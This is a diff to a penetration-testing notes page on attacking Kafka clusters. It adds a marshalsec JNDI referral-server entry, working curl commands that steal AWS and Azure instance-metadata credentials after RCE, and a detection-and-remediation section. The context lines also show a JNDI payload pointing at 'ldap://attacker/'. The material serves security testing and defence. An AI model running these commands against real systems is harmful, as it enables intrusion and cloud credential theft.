@@ -32,6 +32,7 @@ Distributed event streaming platform. Central to modern enterprise data stacks �
 | [[Tools/File Transfer/cURL\|cURL]] | REST interaction — Connect, Schema Registry, REST Proxy, Kafka UI |
 | [[Tools/Remote Access/Netcat\|Netcat]] | ZooKeeper four-letter-word probing (`dump`/`stat`/`ruok`) on 2181 |
 | [[Tools/Payloads & Shells/ysoserial\|ysoserial]] | Gadget chains for the Connect JAAS/JNDI RCE and JMX deserialization RCE |
+| [[Tools/Payloads & Shells/marshalsec\|marshalsec]] | Malicious LDAP/RMI referral server that redirects the JNDI lookup to your gadget payload |
 
 ---
 
@@ -277,6 +278,32 @@ done
 
 ---
 
+## Post-Exploitation → Cloud Metadata
+
+Every RCE vector above (Connect JAAS/JNDI, JMX deserialization, companion-UI) lands you a shell as the Kafka/Connect service account — and these clusters almost always run in a cloud VM or container with an attached instance role. As with [[Services/Cloud & Data/Flink|Flink]] and [[Services/Cloud & Data/Databricks|Databricks]], the highest-value follow-up is the instance metadata service: the cluster's cloud credentials outrank anything in a topic.
+
+```bash
+# AWS (IMDSv2 — v1 401s on hardened instances)
+TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+role=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
+# Azure managed identity
+curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+```
+
+Take the stolen creds to [[Tools/Cloud/aws-cli|aws-cli]] / the provider API to pivot into the wider account.
+
+---
+
+## Detection & Artefacts
+
+- **A new connector is the loudest artefact.** The JAAS/JNDI, OAuthBearer and file-read vectors all create or validate a connector — `GET /connectors` lists survivors, and Connect logs record every `POST`/`PUT /connector-plugins/.../validate`. Even a *validate* call (no connector created) is logged, so the "validate-only" RCE trick is not silent.
+- **Outbound LDAP/RMI from a broker or Connect worker** to an external host is the JNDI-RCE signature — brokers should never egress to arbitrary LDAP.
+- **Topic consumption is nearly invisible** at the broker unless consumer-group/audit logging is on; assume data exfil via `kcat -C` leaves little trace and note that gap in the report.
+- **Root cause to flag:** no authentication on 9092/2181/8081-8083/JMX. Every technique here reduces to an exposed unauthenticated interface — the fix is SASL + ACLs + network isolation, not per-CVE patching.
+
+---
+
 ## Dangerous Settings
 
 | Setting | Risk |
@@ -309,9 +336,15 @@ done
 | Connect JAAS/JNDI RCE | connector w/ `producer.override.sasl.jaas.config=...JndiLoginModule...ldap://attacker/` |
 | JMX RCE | `nmap -p9999 --script rmi-dumpregistry host` → ysoserial gadget over RMI |
 | Search for creds | `kcat ... -e \| grep -i "password\|secret\|token"` |
+| RCE→AWS creds (IMDSv2) | `TOKEN=$(curl -sX PUT .../latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); curl -H "X-aws-ec2-metadata-token: $TOKEN" .../iam/security-credentials/<role>` |
+| Hunt rogue connectors | `curl -s http://host:8083/connectors` |
+
+---
+
+> [!note] **See also** — sibling data-platform notes [[Services/Cloud & Data/Flink|Flink]] and [[Services/Cloud & Data/Databricks|Databricks]] share the RCE→cloud-metadata (IMDS) pivot. RCE tooling: [[Tools/Payloads & Shells/ysoserial|ysoserial]] + [[Tools/Payloads & Shells/marshalsec|marshalsec]]; cloud pivot: [[Tools/Cloud/aws-cli|aws-cli]].
 
 ---
 
 *Created: 2026-07-29*
-*Updated: 2026-07-29*
+*Updated: 2026-09-22*
 *Model: claude-opus-4-8*
